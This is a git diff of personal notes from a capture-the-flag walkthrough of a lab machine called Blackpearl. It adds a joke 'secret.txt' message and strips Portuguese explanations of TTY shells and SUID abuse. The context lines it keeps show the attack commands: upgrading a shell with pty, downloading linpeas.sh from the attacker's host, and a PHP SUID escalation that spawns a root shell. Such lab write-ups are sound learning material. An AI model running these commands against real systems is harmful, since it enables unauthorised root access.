@@ -39,6 +39,14 @@ Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
 
         https://192.168.57.10/secret
+            cat secret.txt
+                OMG you got r00t !
+
+                Just kidding... search somewhere else. Directory busting won't give anything.
+
+                <This message is here so that you don't waste more time directory busting this particular website.>
+
+                - Alek 
 
     dnsrecon -r 127.0.0.0/24 -n 192.168.57.10 -d blah
         [*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
@@ -88,16 +96,7 @@ Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
     google: tty shell
         https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html
-            Se você tiver um shell que não seja tty, existem certos comandos e coisas que você não pode fazer.
-            Isso pode acontecer se você fizer upload de shells reversos em um servidor da Web, de modo que o shell
-            obtido seja do usuário www-data ou similar. Esses usuários não devem ter shells, pois eles não interagem
-            com o sistema como os humanos.
-
-             Portanto, se você não tiver um tty-shell, não poderá executar su, sudopor exemplo.
-             Isso pode ser irritante se você conseguir obter uma senha de root, mas não puder usá-la.
-
-            De qualquer forma, se você obtiver um desses shells, poderá atualizá-lo para um tty-shell usando os seguintes métodos:
-
+            
             python -c 'import pty; pty.spawn("/bin/sh")'
 
              wget http://192.168.57.5/linpeas.sh linpeas.sh
@@ -133,13 +132,9 @@ Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
                     /usr/bin/passwd
                     /usr/bin/chsh
                     /usr/bin/gpasswd
-
+                    
+        Google: gtfobins
         (https://gtfobins.github.io/gtfobins/php/#suid)
-            SUID
-                Se o binário tiver o bit SUID definido, ele não descartará os privilégios elevados e poderá ser abusado
-                para acessar o sistema de arquivos, escalar ou manter acesso privilegiado como um backdoor SUID.
-                Se for usado para executar sh -p, omita o -pargumento em sistemas como Debian (<= Stretch) que permitem que o
-                shell padrão shseja executado com privilégios SUID.
 
             /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
         # whoami
